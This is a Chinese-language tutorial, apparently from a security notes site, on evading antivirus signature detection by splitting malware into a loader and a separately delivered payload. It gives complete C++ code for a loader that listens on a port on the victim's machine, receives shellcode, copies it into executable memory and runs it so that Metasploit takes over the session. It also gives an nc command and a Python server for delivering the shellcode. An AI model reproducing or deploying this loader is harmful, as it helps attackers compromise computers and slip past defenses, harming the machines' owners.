# 简单的分离免杀

## 简介

通常杀毒软件会匹配静态特征来进行恶意软件的识别，虽然现在有很多行为查杀的引擎，但个人认为杀毒软件仍旧已特征码为主，行为免杀很大程度上是监控windows api，而这些恶意软件使用的api往往都是和合法软件是一致的，这也成为了行为查杀技术的桎梏，很多恶意软件只要换个不同的编译环境，就能不被杀毒软件注意到从而绕过杀毒软件。

本文鉴于目前杀毒软件仍旧以特征库为主，将病毒代码体和执行体分离，从而规避特征免杀。

## 流程

1. 在受害者电脑上打开个侦听端口，分配可执行内存
2. 等待传入 payload
3. 连接到受害者侦听端口，将 shellcode 作为二进制数据发送
4. 受害者将 shellcode 拷入可执行内存
5. 执行 shellcode，由 metasploit 接管 session

## 代码实现

给出代码是监听端口等待连接的，也可以做简单修改做成反向连接的。

```text
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <iostream>
#include <Windows.h>
#pragma comment(lib, "ws2_32.lib")
int main(void)
{
LPWSADATA wsaData = new WSAData();
SOCKET listenSocket = INVALID_SOCKET;
SOCKET ClientSocket = INVALID_SOCKET;
CHAR bufferReceivedBytes[4096] = { 0 };
INT RecvBytes = 0;
PCSTR port = "477";
ADDRINFOA* SocketHint = new ADDRINFOA();
ADDRINFOA* AddrInfo = new ADDRINFOA();
SocketHint->ai_family = AF_INET;
SocketHint->ai_socktype = SOCK_STREAM;
SocketHint->ai_protocol = IPPROTO_TCP;
SocketHint->ai_flags = AI_PASSIVE;
WSAStartup(MAKEWORD(2, 2), wsaData);
GetAddrInfoA(NULL, port, SocketHint, &AddrInfo);
listenSocket = socket(AddrInfo->ai_family, AddrInfo->ai_socktype,
AddrInfo->ai_protocol);
bind(listenSocket, AddrInfo->ai_addr, AddrInfo->ai_addrlen);
listen(listenSocket, SOMAXCONN);
ClientSocket = accept(listenSocket, NULL, NULL);
RecvBytes = recv(ClientSocket, bufferReceivedBytes, sizeof(bufferReceivedBytes),
NULL);
LPVOID shellcode = VirtualAlloc(NULL, RecvBytes, MEM_COMMIT | MEM_RESERVE,
PAGE_EXECUTE_READWRITE);
memcpy(shellcode, bufferReceivedBytes, sizeof(bufferReceivedBytes));
((void(*)()) shellcode)();
return 0;
}
```

## 实现效果

![](../.gitbook/assets/image%20%2845%29.png)

端口已经开始侦听 我们使用 msf 生成 shellcode 并通过 nc 交付给受害者

![](../.gitbook/assets/image%20%2870%29.png)

生成一段 c 格式的 shellcode

![](../.gitbook/assets/image%20%2855%29.png)

处理一下变成一句字符串的形式

![](../.gitbook/assets/image%20%284%29.png)

```text
echo -e “shellcode-line” |nc  ip port
```

可以使用简单的python服务器传递shellcode

```text
import socket
import threading
import time  

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('127.0.0.1', 36444)) # 公网地址
    s.listen(20)
    timeout = 10
    socket.setdefaulttimeout(timeout)
    while True:
        sock, addr = s.accept()
        t = threading.Thread(target=tcplink, args=(sock, addr))
        t.start()


def tcplink(sock, addr):
    print('Start download shellcode %s:%s...' % addr)
    shellcode = b'1111111' #your shellcode
    print(len(shellcode))
    while True:
        data = sock.recv(1024)
        time.sleep(3)
        sock.send(shellcode)
        sock.close()
    print('Finish %s:%s ' % addr)


if __name__ == '__main__':
    main()
```

![](../.gitbook/assets/image%20%2861%29.png)

![](../.gitbook/assets/image%20%2826%29.png)



